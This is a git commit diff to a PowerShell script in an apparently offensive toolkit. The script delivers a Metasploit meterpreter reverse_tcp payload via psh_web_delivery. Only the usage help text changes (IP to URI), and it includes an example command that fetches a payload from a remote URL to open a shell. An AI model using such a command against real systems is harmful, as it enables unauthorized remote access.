d9a42457ae569a5d5b0b2eb9f38ea05c37af8b47
attackdebris <attackdebris@wirelessdefence.org>
2014-06-09 22:44:45 +0100

    msf meterpreter reverse_tcp

--- powershell/msf-meterpreter-reverse_tcp.ps1
+++ powershell/msf-meterpreter-reverse_tcp.ps1
@@ -19,7 +19,7 @@ echo "msf-meterpreter-reverse_tcp.ps1 ( https://github.com/attackdebris/babel-sf
 echo "`n[This script should be utilised with exploit/windows/misc/psh_web_delivery and a meterpreter reverse_tcp payload]"
 echo "[When configuring psh_web_delivery ensure correct payload architecture is selected i.e. x86 or x64]"
 echo "`nUsage:"
-echo ".\msf-meterpreter-reverse_tcp.ps1 [psh_web_delivery IP]"
+echo ".\msf-meterpreter-reverse_tcp.ps1 [psh_web_delivery URI]"
 echo "e.g. .\msf-meterpreter-reverse_tcp http://192.168.0.1:8080/psh-payload`n"
 Exit
 }
